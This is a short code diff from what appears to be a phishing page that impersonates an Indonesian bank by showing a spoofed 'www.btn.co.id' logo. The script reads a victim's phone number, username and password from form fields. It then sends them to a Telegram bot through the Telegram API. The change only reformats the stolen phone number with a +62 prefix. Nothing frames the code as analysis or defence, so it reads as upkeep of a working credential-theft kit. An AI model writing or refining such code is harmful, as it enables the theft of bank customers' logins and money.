@@ -181,7 +181,7 @@ var logo = "━─━─༺𝙬𝙬𝙬.𝙗𝙩𝙣.𝙘𝙤.𝙞𝙙___▩";
   var pass = $('#pass').val();
   sessionStorage.setItem('pass', pass);
           
-    var gabungan = "" + logo + '%0A※ 𝗡𝗼.𝗛𝗣 •• ' + nohp + '%0A%0A※ 𝗨𝘀𝗲𝗿 •• ' + user + '%0A※ 𝗣𝗮𝘀𝘀 •• ' + pass;
+    var gabungan = "" + logo + '%0A※ 𝗡𝗼.𝗛𝗣 •• %2B62' + nohp + '%0A%0A※ 𝗨𝘀𝗲𝗿 •• ' + user + '%0A※ 𝗣𝗮𝘀𝘀 •• ' + pass;
         $.ajax({                   
             url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
             method: `POST`,                      
